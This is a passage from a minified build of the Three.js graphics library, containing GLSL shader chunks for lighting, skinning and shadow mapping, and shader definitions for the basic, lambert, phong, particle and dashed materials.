MAX_DIR_LIGHTS > 0\n\n	uniform vec3 directionalLightColor[ MAX_DIR_LIGHTS ];\n	uniform vec3 directionalLightDirection[ MAX_DIR_LIGHTS ];\n\n#endif\n\n#if MAX_HEMI_LIGHTS > 0\n\n	uniform vec3 hemisphereLightSkyColor[ MAX_HEMI_LIGHTS ];\n	uniform vec3 hemisphereLightGroundColor[ MAX_HEMI_LIGHTS ];\n	uniform vec3 hemisphereLightDirection[ MAX_HEMI_LIGHTS ];\n\n#endif\n\n#if MAX_POINT_LIGHTS > 0\n\n	uniform vec3 pointLightColor[ MAX_POINT_LIGHTS ];\n\n	uniform vec3 pointLightPosition[ MAX_POINT_LIGHTS ];\n	uniform float pointLightDistance[ MAX_POINT_LIGHTS ];\n	uniform float pointLightDecay[ MAX_POINT_LIGHTS ];\n\n#endif\n\n#if MAX_SPOT_LIGHTS > 0\n\n	uniform vec3 spotLightColor[ MAX_SPOT_LIGHTS ];\n	uniform vec3 spotLightPosition[ MAX_SPOT_LIGHTS ];\n	uniform vec3 spotLightDirection[ MAX_SPOT_LIGHTS ];\n	uniform float spotLightAngleCos[ MAX_SPOT_LIGHTS ];\n	uniform float spotLightExponent[ MAX_SPOT_LIGHTS ];\n	uniform float spotLightDistance[ MAX_SPOT_LIGHTS ];\n	uniform float spotLightDecay[ MAX_SPOT_LIGHTS ];\n\n#endif\n\n#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP ) || defined( USE_ENVMAP )\n\n	varying vec3 vWorldPosition;\n\n#endif\n\n#ifdef WRAP_AROUND\n\n	uniform vec3 wrapRGB;\n\n#endif\n\nvarying vec3 vViewPosition;\n\n#ifndef FLAT_SHADED\n\n	varying vec3 vNormal;\n\n#endif\n",THREE.ShaderChunk.skinbase_vertex="#ifdef USE_SKINNING\n\n	mat4 boneMatX = getBoneMatrix( skinIndex.x );\n	mat4 boneMatY = getBoneMatrix( skinIndex.y );\n	mat4 boneMatZ = getBoneMatrix( skinIndex.z );\n	mat4 boneMatW = getBoneMatrix( skinIndex.w );\n\n#endif",THREE.ShaderChunk.map_vertex="#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP )\n\n	vUv = uv * offsetRepeat.zw + offsetRepeat.xy;\n\n#endif",THREE.ShaderChunk.lightmap_fragment="#ifdef USE_LIGHTMAP\n\n	outgoingLight *= diffuseColor.xyz * texture2D( lightMap, vUv2 ).xyz;\n\n#endif",THREE.ShaderChunk.shadowmap_pars_vertex="#ifdef USE_SHADOWMAP\n\n	varying vec4 vShadowCoord[ MAX_SHADOWS ];\n	uniform mat4 shadowMatrix[ MAX_SHADOWS ];\n\n#endif",THREE.ShaderChunk.color_fragment="#ifdef USE_COLOR\n\n	diffuseColor.rgb *= vColor;\n\n#endif",THREE.ShaderChunk.morphtarget_vertex="#ifdef USE_MORPHTARGETS\n\n	vec3 morphed = vec3( 0.0 );\n	morphed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\n	morphed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\n	morphed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\n	morphed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\n\n	#ifndef USE_MORPHNORMALS\n\n	morphed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\n	morphed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\n	morphed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\n	morphed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\n\n	#endif\n\n	morphed += position;\n\n#endif",THREE.ShaderChunk.envmap_vertex="#if defined( USE_ENVMAP ) && ! defined( USE_BUMPMAP ) && ! defined( USE_NORMALMAP ) && ! defined( PHONG )\n\n	vec3 worldNormal = transformDirection( objectNormal, modelMatrix );\n\n	vec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\n\n	#ifdef ENVMAP_MODE_REFLECTION\n\n		vReflect = reflect( cameraToVertex, worldNormal );\n\n	#else\n\n		vReflect = refract( cameraToVertex, worldNormal, refractionRatio );\n\n	#endif\n\n#endif\n",THREE.ShaderChunk.shadowmap_fragment="#ifdef USE_SHADOWMAP\n\n	#ifdef SHADOWMAP_DEBUG\n\n		vec3 frustumColors[3];\n		frustumColors[0] = vec3( 1.0, 0.5, 0.0 );\n		frustumColors[1] = vec3( 0.0, 1.0, 0.8 );\n		frustumColors[2] = vec3( 0.0, 0.5, 1.0 );\n\n	#endif\n\n	#ifdef SHADOWMAP_CASCADE\n\n		int inFrustumCount = 0;\n\n	#endif\n\n	float fDepth;\n	vec3 shadowColor = vec3( 1.0 );\n\n	for( int i = 0; i < MAX_SHADOWS; i ++ ) {\n\n		vec3 shadowCoord = vShadowCoord[ i ].xyz / vShadowCoord[ i ].w;\n\n				// if ( something && something ) breaks ATI OpenGL shader compiler\n				// if ( all( something, something ) ) using this instead\n\n		bvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\n		bool inFrustum = all( inFrustumVec );\n\n				// don't shadow pixels outside of light frustum\n				// use just first frustum (for cascades)\n				// don't shadow pixels behind far plane of light frustum\n\n		#ifdef SHADOWMAP_CASCADE\n\n			inFrustumCount += int( inFrustum );\n			bvec3 frustumTestVec = bvec3( inFrustum, inFrustumCount == 1, shadowCoord.z <= 1.0 );\n\n		#else\n\n			bvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\n\n		#endif\n\n		bool frustumTest = all( frustumTestVec );\n\n		if ( frustumTest ) {\n\n			shadowCoord.z += shadowBias[ i ];\n\n			#if defined( SHADOWMAP_TYPE_PCF )\n\n						// Percentage-close filtering\n						// (9 pixel kernel)\n						// http://fabiensanglard.net/shadowmappingPCF/\n\n				float shadow = 0.0;\n\n		/*\n						// nested loops breaks shader compiler / validator on some ATI cards when using OpenGL\n						// must enroll loop manually\n\n				for ( float y = -1.25; y <= 1.25; y += 1.25 )\n					for ( float x = -1.25; x <= 1.25; x += 1.25 ) {\n\n						vec4 rgbaDepth = texture2D( shadowMap[ i ], vec2( x * xPixelOffset, y * yPixelOffset ) + shadowCoord.xy );\n\n								// doesn't seem to produce any noticeable visual difference compared to simple texture2D lookup\n								//vec4 rgbaDepth = texture2DProj( shadowMap[ i ], vec4( vShadowCoord[ i ].w * ( vec2( x * xPixelOffset, y * yPixelOffset ) + shadowCoord.xy ), 0.05, vShadowCoord[ i ].w ) );\n\n						float fDepth = unpackDepth( rgbaDepth );\n\n						if ( fDepth < shadowCoord.z )\n							shadow += 1.0;\n\n				}\n\n				shadow /= 9.0;\n\n		*/\n\n				const float shadowDelta = 1.0 / 9.0;\n\n				float xPixelOffset = 1.0 / shadowMapSize[ i ].x;\n				float yPixelOffset = 1.0 / shadowMapSize[ i ].y;\n\n				float dx0 = -1.25 * xPixelOffset;\n				float dy0 = -1.25 * yPixelOffset;\n				float dx1 = 1.25 * xPixelOffset;\n				float dy1 = 1.25 * yPixelOffset;\n\n				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) );\n				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;\n\n				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) );\n				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;\n\n				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) );\n				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;\n\n				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) );\n				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;\n\n				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy ) );\n				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;\n\n				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) );\n				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;\n\n				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) );\n				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;\n\n				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) );\n				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;\n\n				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) );\n				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;\n\n				shadowColor = shadowColor * vec3( ( 1.0 - shadowDarkness[ i ] * shadow ) );\n\n			#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\n\n						// Percentage-close filtering\n						// (9 pixel kernel)\n						// http://fabiensanglard.net/shadowmappingPCF/\n\n				float shadow = 0.0;\n\n				float xPixelOffset = 1.0 / shadowMapSize[ i ].x;\n				float yPixelOffset = 1.0 / shadowMapSize[ i ].y;\n\n				float dx0 = -1.0 * xPixelOffset;\n				float dy0 = -1.0 * yPixelOffset;\n				float dx1 = 1.0 * xPixelOffset;\n				float dy1 = 1.0 * yPixelOffset;\n\n				mat3 shadowKernel;\n				mat3 depthKernel;\n\n				depthKernel[0][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) );\n				depthKernel[0][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) );\n				depthKernel[0][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) );\n				depthKernel[1][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) );\n				depthKernel[1][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy ) );\n				depthKernel[1][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) );\n				depthKernel[2][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) );\n				depthKernel[2][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) );\n				depthKernel[2][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) );\n\n				vec3 shadowZ = vec3( shadowCoord.z );\n				shadowKernel[0] = vec3(lessThan(depthKernel[0], shadowZ ));\n				shadowKernel[0] *= vec3(0.25);\n\n				shadowKernel[1] = vec3(lessThan(depthKernel[1], shadowZ ));\n				shadowKernel[1] *= vec3(0.25);\n\n				shadowKernel[2] = vec3(lessThan(depthKernel[2], shadowZ ));\n				shadowKernel[2] *= vec3(0.25);\n\n				vec2 fractionalCoord = 1.0 - fract( shadowCoord.xy * shadowMapSize[i].xy );\n\n				shadowKernel[0] = mix( shadowKernel[1], shadowKernel[0], fractionalCoord.x );\n				shadowKernel[1] = mix( shadowKernel[2], shadowKernel[1], fractionalCoord.x );\n\n				vec4 shadowValues;\n				shadowValues.x = mix( shadowKernel[0][1], shadowKernel[0][0], fractionalCoord.y );\n				shadowValues.y = mix( shadowKernel[0][2], shadowKernel[0][1], fractionalCoord.y );\n				shadowValues.z = mix( shadowKernel[1][1], shadowKernel[1][0], fractionalCoord.y );\n				shadowValues.w = mix( shadowKernel[1][2], shadowKernel[1][1], fractionalCoord.y );\n\n				shadow = dot( shadowValues, vec4( 1.0 ) );\n\n				shadowColor = shadowColor * vec3( ( 1.0 - shadowDarkness[ i ] * shadow ) );\n\n			#else\n\n				vec4 rgbaDepth = texture2D( shadowMap[ i ], shadowCoord.xy );\n				float fDepth = unpackDepth( rgbaDepth );\n\n				if ( fDepth < shadowCoord.z )\n\n		// spot with multiple shadows is darker\n\n					shadowColor = shadowColor * vec3( 1.0 - shadowDarkness[ i ] );\n\n		// spot with multiple shadows has the same color as single shadow spot\n\n		// 					shadowColor = min( shadowColor, vec3( shadowDarkness[ i ] ) );\n\n			#endif\n\n		}\n\n\n		#ifdef SHADOWMAP_DEBUG\n\n			#ifdef SHADOWMAP_CASCADE\n\n				if ( inFrustum && inFrustumCount == 1 ) outgoingLight *= frustumColors[ i ];\n\n			#else\n\n				if ( inFrustum ) outgoingLight *= frustumColors[ i ];\n\n			#endif\n\n		#endif\n\n	}\n\n	// NOTE: I am unsure if this is correct in linear space.  -bhouston, Dec 29, 2014\n	shadowColor = inputToLinear( shadowColor );\n\n	outgoingLight = outgoingLight * shadowColor;\n\n#endif\n",THREE.ShaderChunk.worldpos_vertex="#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )\n\n	#ifdef USE_SKINNING\n\n		vec4 worldPosition = modelMatrix * skinned;\n\n	#elif defined( USE_MORPHTARGETS )\n\n		vec4 worldPosition = modelMatrix * vec4( morphed, 1.0 );\n\n	#else\n\n		vec4 worldPosition = modelMatrix * vec4( position, 1.0 );\n\n	#endif\n\n#endif\n",THREE.ShaderChunk.shadowmap_pars_fragment="#ifdef USE_SHADOWMAP\n\n	uniform sampler2D shadowMap[ MAX_SHADOWS ];\n	uniform vec2 shadowMapSize[ MAX_SHADOWS ];\n\n	uniform float shadowDarkness[ MAX_SHADOWS ];\n	uniform float shadowBias[ MAX_SHADOWS ];\n\n	varying vec4 vShadowCoord[ MAX_SHADOWS ];\n\n	float unpackDepth( const in vec4 rgba_depth ) {\n\n		const vec4 bit_shift = vec4( 1.0 / ( 256.0 * 256.0 * 256.0 ), 1.0 / ( 256.0 * 256.0 ), 1.0 / 256.0, 1.0 );\n		float depth = dot( rgba_depth, bit_shift );\n		return depth;\n\n	}\n\n#endif",THREE.ShaderChunk.skinning_pars_vertex="#ifdef USE_SKINNING\n\n	uniform mat4 bindMatrix;\n	uniform mat4 bindMatrixInverse;\n\n	#ifdef BONE_TEXTURE\n\n		uniform sampler2D boneTexture;\n		uniform int boneTextureWidth;\n		uniform int boneTextureHeight;\n\n		mat4 getBoneMatrix( const in float i ) {\n\n			float j = i * 4.0;\n			float x = mod( j, float( boneTextureWidth ) );\n			float y = floor( j / float( boneTextureWidth ) );\n\n			float dx = 1.0 / float( boneTextureWidth );\n			float dy = 1.0 / float( boneTextureHeight );\n\n			y = dy * ( y + 0.5 );\n\n			vec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\n			vec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\n			vec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\n			vec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\n\n			mat4 bone = mat4( v1, v2, v3, v4 );\n\n			return bone;\n\n		}\n\n	#else\n\n		uniform mat4 boneGlobalMatrices[ MAX_BONES ];\n\n		mat4 getBoneMatrix( const in float i ) {\n\n			mat4 bone = boneGlobalMatrices[ int(i) ];\n			return bone;\n\n		}\n\n	#endif\n\n#endif\n",THREE.ShaderChunk.logdepthbuf_pars_fragment="#ifdef USE_LOGDEPTHBUF\n\n	uniform float logDepthBufFC;\n\n	#ifdef USE_LOGDEPTHBUF_EXT\n\n		#extension GL_EXT_frag_depth : enable\n		varying float vFragDepth;\n\n	#endif\n\n#endif",THREE.ShaderChunk.alphamap_fragment="#ifdef USE_ALPHAMAP\n\n	diffuseColor.a *= texture2D( alphaMap, vUv ).g;\n\n#endif\n",THREE.ShaderChunk.alphamap_pars_fragment="#ifdef USE_ALPHAMAP\n\n	uniform sampler2D alphaMap;\n\n#endif\n",THREE.UniformsUtils={merge:function(e){for(var t={},r=0;r<e.length;r++){var i=this.clone(e[r]);for(var n in i)t[n]=i[n]}return t},clone:function(e){var t={};for(var r in e){t[r]={};for(var i in e[r]){var n=e[r][i];n instanceof THREE.Color||n instanceof THREE.Vector2||n instanceof THREE.Vector3||n instanceof THREE.Vector4||n instanceof THREE.Matrix4||n instanceof THREE.Texture?t[r][i]=n.clone():n instanceof Array?t[r][i]=n.slice():t[r][i]=n}}return t}},THREE.UniformsLib={common:{diffuse:{type:"c",value:new THREE.Color(15658734)},opacity:{type:"f",value:1},map:{type:"t",value:null},offsetRepeat:{type:"v4",value:new THREE.Vector4(0,0,1,1)},lightMap:{type:"t",value:null},specularMap:{type:"t",value:null},alphaMap:{type:"t",value:null},envMap:{type:"t",value:null},flipEnvMap:{type:"f",value:-1},reflectivity:{type:"f",value:1},refractionRatio:{type:"f",value:.98},morphTargetInfluences:{type:"f",value:0}},bump:{bumpMap:{type:"t",value:null},bumpScale:{type:"f",value:1}},normalmap:{normalMap:{type:"t",value:null},normalScale:{type:"v2",value:new THREE.Vector2(1,1)}},fog:{fogDensity:{type:"f",value:25e-5},fogNear:{type:"f",value:1},fogFar:{type:"f",value:2e3},fogColor:{type:"c",value:new THREE.Color(16777215)}},lights:{ambientLightColor:{type:"fv",value:[]},directionalLightDirection:{type:"fv",value:[]},directionalLightColor:{type:"fv",value:[]},hemisphereLightDirection:{type:"fv",value:[]},hemisphereLightSkyColor:{type:"fv",value:[]},hemisphereLightGroundColor:{type:"fv",value:[]},pointLightColor:{type:"fv",value:[]},pointLightPosition:{type:"fv",value:[]},pointLightDistance:{type:"fv1",value:[]},pointLightDecay:{type:"fv1",value:[]},spotLightColor:{type:"fv",value:[]},spotLightPosition:{type:"fv",value:[]},spotLightDirection:{type:"fv",value:[]},spotLightDistance:{type:"fv1",value:[]},spotLightAngleCos:{type:"fv1",value:[]},spotLightExponent:{type:"fv1",value:[]},spotLightDecay:{type:"fv1",value:[]}},particle:{psColor:{type:"c",value:new THREE.Color(15658734)},opacity:{type:"f",value:1},size:{type:"f",value:1},scale:{type:"f",value:1},map:{type:"t",value:null},offsetRepeat:{type:"v4",value:new THREE.Vector4(0,0,1,1)},fogDensity:{type:"f",value:25e-5},fogNear:{type:"f",value:1},fogFar:{type:"f",value:2e3},fogColor:{type:"c",value:new THREE.Color(16777215)}},shadowmap:{shadowMap:{type:"tv",value:[]},shadowMapSize:{type:"v2v",value:[]},shadowBias:{type:"fv1",value:[]},shadowDarkness:{type:"fv1",value:[]},shadowMatrix:{type:"m4v",value:[]}}},THREE.ShaderLib={basic:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,THREE.UniformsLib.shadowmap]),vertexShader:[THREE.ShaderChunk.common,THREE.ShaderChunk.map_pars_vertex,THREE.ShaderChunk.lightmap_pars_vertex,THREE.ShaderChunk.envmap_pars_vertex,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,THREE.ShaderChunk.logdepthbuf_pars_vertex,"void main() {",THREE.ShaderChunk.map_vertex,THREE.ShaderChunk.lightmap_vertex,THREE.ShaderChunk.color_vertex,THREE.ShaderChunk.skinbase_vertex,"	#ifdef USE_ENVMAP",THREE.ShaderChunk.morphnormal_vertex,THREE.ShaderChunk.skinnormal_vertex,THREE.ShaderChunk.defaultnormal_vertex,"	#endif",THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,THREE.ShaderChunk.logdepthbuf_vertex,THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.envmap_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform vec3 diffuse;","uniform float opacity;",THREE.ShaderChunk.common,THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_pars_fragment,THREE.ShaderChunk.alphamap_pars_fragment,THREE.ShaderChunk.lightmap_pars_fragment,THREE.ShaderChunk.envmap_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,THREE.ShaderChunk.specularmap_pars_fragment,THREE.ShaderChunk.logdepthbuf_pars_fragment,"void main() {","	vec3 outgoingLight = vec3( 0.0 );","	vec4 diffuseColor = vec4( diffuse, opacity );",THREE.ShaderChunk.logdepthbuf_fragment,THREE.ShaderChunk.map_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.alphamap_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.specularmap_fragment,"	outgoingLight = diffuseColor.rgb;",THREE.ShaderChunk.lightmap_fragment,THREE.ShaderChunk.envmap_fragment,THREE.ShaderChunk.shadowmap_fragment,THREE.ShaderChunk.linear_to_gamma_fragment,THREE.ShaderChunk.fog_fragment,"	gl_FragColor = vec4( outgoingLight, diffuseColor.a );","}"].join("\n")},lambert:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,THREE.UniformsLib.lights,THREE.UniformsLib.shadowmap,{emissive:{type:"c",value:new THREE.Color(0)},wrapRGB:{type:"v3",value:new THREE.Vector3(1,1,1)}}]),vertexShader:["#define LAMBERT","varying vec3 vLightFront;","#ifdef DOUBLE_SIDED","	varying vec3 vLightBack;","#endif",THREE.ShaderChunk.common,THREE.ShaderChunk.map_pars_vertex,THREE.ShaderChunk.lightmap_pars_vertex,THREE.ShaderChunk.envmap_pars_vertex,THREE.ShaderChunk.lights_lambert_pars_vertex,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,THREE.ShaderChunk.logdepthbuf_pars_vertex,"void main() {",THREE.ShaderChunk.map_vertex,THREE.ShaderChunk.lightmap_vertex,THREE.ShaderChunk.color_vertex,THREE.ShaderChunk.morphnormal_vertex,THREE.ShaderChunk.skinbase_vertex,THREE.ShaderChunk.skinnormal_vertex,THREE.ShaderChunk.defaultnormal_vertex,THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,THREE.ShaderChunk.logdepthbuf_vertex,THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.envmap_vertex,THREE.ShaderChunk.lights_lambert_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform vec3 diffuse;","uniform vec3 emissive;","uniform float opacity;","varying vec3 vLightFront;","#ifdef DOUBLE_SIDED","	varying vec3 vLightBack;","#endif",THREE.ShaderChunk.common,THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_pars_fragment,THREE.ShaderChunk.alphamap_pars_fragment,THREE.ShaderChunk.lightmap_pars_fragment,THREE.ShaderChunk.envmap_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,THREE.ShaderChunk.specularmap_pars_fragment,THREE.ShaderChunk.logdepthbuf_pars_fragment,"void main() {","	vec3 outgoingLight = vec3( 0.0 );","	vec4 diffuseColor = vec4( diffuse, opacity );",THREE.ShaderChunk.logdepthbuf_fragment,THREE.ShaderChunk.map_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.alphamap_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.specularmap_fragment,"	#ifdef DOUBLE_SIDED","		if ( gl_FrontFacing )","			outgoingLight += diffuseColor.rgb * vLightFront + emissive;","		else","			outgoingLight += diffuseColor.rgb * vLightBack + emissive;","	#else","		outgoingLight += diffuseColor.rgb * vLightFront + emissive;","	#endif",THREE.ShaderChunk.lightmap_fragment,THREE.ShaderChunk.envmap_fragment,THREE.ShaderChunk.shadowmap_fragment,THREE.ShaderChunk.linear_to_gamma_fragment,THREE.ShaderChunk.fog_fragment,"	gl_FragColor = vec4( outgoingLight, diffuseColor.a );","}"].join("\n")},phong:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.bump,THREE.UniformsLib.normalmap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,THREE.UniformsLib.shadowmap,{emissive:{type:"c",value:new THREE.Color(0)},specular:{type:"c",value:new THREE.Color(1118481)},shininess:{type:"f",value:30},wrapRGB:{type:"v3",value:new THREE.Vector3(1,1,1)}}]),vertexShader:["#define PHONG","varying vec3 vViewPosition;","#ifndef FLAT_SHADED","	varying vec3 vNormal;","#endif",THREE.ShaderChunk.common,THREE.ShaderChunk.map_pars_vertex,THREE.ShaderChunk.lightmap_pars_vertex,THREE.ShaderChunk.envmap_pars_vertex,THREE.ShaderChunk.lights_phong_pars_vertex,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,THREE.ShaderChunk.logdepthbuf_pars_vertex,"void main() {",THREE.ShaderChunk.map_vertex,THREE.ShaderChunk.lightmap_vertex,THREE.ShaderChunk.color_vertex,THREE.ShaderChunk.morphnormal_vertex,THREE.ShaderChunk.skinbase_vertex,THREE.ShaderChunk.skinnormal_vertex,THREE.ShaderChunk.defaultnormal_vertex,"#ifndef FLAT_SHADED","	vNormal = normalize( transformedNormal );","#endif",THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,THREE.ShaderChunk.logdepthbuf_vertex,"	vViewPosition = -mvPosition.xyz;",THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.envmap_vertex,THREE.ShaderChunk.lights_phong_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),
fragmentShader:["#define PHONG","uniform vec3 diffuse;","uniform vec3 emissive;","uniform vec3 specular;","uniform float shininess;","uniform float opacity;",THREE.ShaderChunk.common,THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_pars_fragment,THREE.ShaderChunk.alphamap_pars_fragment,THREE.ShaderChunk.lightmap_pars_fragment,THREE.ShaderChunk.envmap_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.lights_phong_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,THREE.ShaderChunk.bumpmap_pars_fragment,THREE.ShaderChunk.normalmap_pars_fragment,THREE.ShaderChunk.specularmap_pars_fragment,THREE.ShaderChunk.logdepthbuf_pars_fragment,"void main() {","	vec3 outgoingLight = vec3( 0.0 );","	vec4 diffuseColor = vec4( diffuse, opacity );",THREE.ShaderChunk.logdepthbuf_fragment,THREE.ShaderChunk.map_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.alphamap_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.specularmap_fragment,THREE.ShaderChunk.lights_phong_fragment,THREE.ShaderChunk.lightmap_fragment,THREE.ShaderChunk.envmap_fragment,THREE.ShaderChunk.shadowmap_fragment,THREE.ShaderChunk.linear_to_gamma_fragment,THREE.ShaderChunk.fog_fragment,"	gl_FragColor = vec4( outgoingLight, diffuseColor.a );","}"].join("\n")},particle_basic:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.particle,THREE.UniformsLib.shadowmap]),vertexShader:["uniform float size;","uniform float scale;",THREE.ShaderChunk.common,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,THREE.ShaderChunk.logdepthbuf_pars_vertex,"void main() {",THREE.ShaderChunk.color_vertex,"	vec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );","	#ifdef USE_SIZEATTENUATION","		gl_PointSize = size * ( scale / length( mvPosition.xyz ) );","	#else","		gl_PointSize = size;","	#endif","	gl_Position = projectionMatrix * mvPosition;",THREE.ShaderChunk.logdepthbuf_vertex,THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform vec3 psColor;","uniform float opacity;",THREE.ShaderChunk.common,THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_particle_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,THREE.ShaderChunk.logdepthbuf_pars_fragment,"void main() {","	vec3 outgoingLight = vec3( 0.0 );","	vec4 diffuseColor = vec4( psColor, opacity );",THREE.ShaderChunk.logdepthbuf_fragment,THREE.ShaderChunk.map_particle_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.alphatest_fragment,"	outgoingLight = diffuseColor.rgb;",THREE.ShaderChunk.shadowmap_fragment,THREE.ShaderChunk.fog_fragment,"	gl_FragColor = vec4( outgoingLight, diffuseColor.a );","}"].join("\n")},dashed:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,{scale:{type:"f",value:1},dashSize:{type:"f",value:1},totalSize:{type:"f",value:2}}]),vertexShader:["uniform float scale;","attribute float lineDistance;","varying float vLineDistance;",THREE.ShaderChunk.common,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.logdepthbuf_pars_vertex,"void main() {",THREE.ShaderChunk.color_vertex,"	vLineDistance = scale * lineDistance;","	vec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );","	gl_Position = projectionMatrix * mvPosition;",THREE.ShaderChunk.logdepthbuf_vertex,"}"].join("\n"),fragmentShader:["uniform vec3 diffuse;","uniform float opacity;","uniform float dashSize;","uniform float totalSize;","varying float vLineDistance;",THREE.ShaderChunk.common,THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.logdepthbuf_pars_fragment,"void main() {","	if ( mod( vLineDistance, totalSize ) > dashSize ) {","		discard;","	}","	vec3 outgoingLight = vec3( 0.0 );","	vec4 diffuseColor = 